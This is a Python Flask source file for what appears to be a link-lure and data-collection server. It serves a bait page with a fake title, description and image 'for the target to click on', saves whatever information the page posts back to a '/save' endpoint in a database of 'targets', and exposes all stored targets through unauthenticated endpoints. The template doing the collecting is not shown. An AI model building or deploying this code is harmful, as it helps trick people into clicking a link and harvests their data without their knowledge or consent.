from flask import Flask, jsonify, render_template, request
from flask_sqlalchemy import SQLAlchemy
import json
from flask_cors import CORS, cross_origin
from hashlib import md5

    
app = Flask(__name__)

#initialize configuration
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///fallamoi.db"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

#create target database model 
class Target(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    tid = db.Column(db.String)
    data = db.Column(db.String,nullable=False)
    #data is a dictionary of data that we will transform into a character string 
    #but when we want to retrieve them for precise processing, we will parse them in json 
CORS(app, supports_credentials=False)

# db
USERS = {}

# payloads
PAYLOADS = {
    'poisson': {
        'title': 'poisson qui vole',
        'description': 'poisson qui vole sur les voitures',
        'image': 'https://i.ytimg.com/vi/-qXSyeEu7D0/maxresdefault.jpg',
        'url': 'http://testtest.com',
    }
}

# hash
def hashit(string: str) -> str:
    return md5(string.encode('utf-8')).hexdigest()


@app.route('/')
def index():
    return ""


# 1-) to set the payload html
# for the target to clck on it
@app.route('/<link_uid>')
def set_payload(link_uid: str):
    payload = PAYLOADS.get(link_uid, {})
    return render_template(
            './index.html',
            title=payload.get('title'),
            description=payload.get('description'),
            image=payload.get('image'),
            url=payload.get('url')
    )


# 2-)  Save our target information
# ...
@app.route('/save', methods=['POST'])
def save_info():
    data = request.get_json()
    user_key = hashit(json.dumps(data))
    dat = json.dumps(data)
    USERS[user_key] = data
    #sotre target data to database
    print(user_key)
    target = Target(tid = user_key,data = dat)
    db.session.add(target)
    db.session.commit()
    return {'status': 'true'}, 200


# 3-) to get a user information we aved precedently
@app.route('/user/<user_uid>')
def get_user(user_uid: str):
    
    #get target information
    target = Target.query.filter_by(tid=user_uid).first()
    res = {
          'id':target.id,
          'tid':target.tid,
          'data':target.data,
      }
    return res , 200

# 4-) return all users
@app.route('/users')
def get_users():
    targets = Target.query.all()
    res = []
    # foreach target append  her data to array 
    for target in targets:
      res.append({
          'id':target.id,
          'tid':target.tid,
          'data':target.data,
      })
    return res , 200  


if __name__ == '__main__':
    with app.app_context():
     db.create_all()
    app.run(port=3001, debug=True)
